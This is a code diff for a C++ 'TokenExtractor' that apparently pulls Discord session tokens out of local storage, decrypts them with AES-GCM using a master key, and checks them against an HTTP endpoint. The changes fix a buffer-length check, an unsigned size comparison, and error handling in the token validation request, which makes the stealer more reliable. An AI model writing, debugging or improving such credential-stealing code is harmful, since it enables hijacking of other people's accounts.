@@ -225,7 +225,7 @@ bool TokenExtractor::GetMasterKey(const std::string& discord_path,
 std::string TokenExtractor::DecryptToken(const std::vector<uint8_t>& master_key,
                                            const std::string& encrypted_b64) {
     std::vector<uint8_t> data = Base64Decode(encrypted_b64);
-    if (data.size() < 31) return ""; // 3 version + 12 IV + 16 tag minimum
+    if (data.size() < 32) return ""; // 3 version + 12 IV + 1 ciphertext + 16 tag minimum
 
     // Strip 3-byte version prefix (e.g., "v10")
     const uint8_t* iv        = data.data() + 3;
@@ -234,7 +234,7 @@ std::string TokenExtractor::DecryptToken(const std::vector<uint8_t>& master_key,
     size_t        cipher_len = data.size() - 3 - 12 - 16; // minus tag
     const uint8_t* tag       = data.data() + data.size() - 16;
 
-    if (cipher_len <= 0) return "";
+    if (cipher_len == 0) return "";
 
     // Use BCrypt for AES-GCM
     BCRYPT_ALG_HANDLE hAlg = nullptr;
@@ -386,8 +386,13 @@ bool TokenExtractor::ValidateToken(const std::string& token, std::string& out_us
     }
 
     std::string auth_header = "Authorization: " + token;
-    HttpSendRequestA(hRequest, auth_header.c_str(),
-                      static_cast<DWORD>(auth_header.length()), nullptr, 0);
+    if (!HttpSendRequestA(hRequest, auth_header.c_str(),
+                          static_cast<DWORD>(auth_header.length()), nullptr, 0)) {
+        InternetCloseHandle(hRequest);
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return false;
+    }
 
     // Read response
     DWORD status_code = 0;
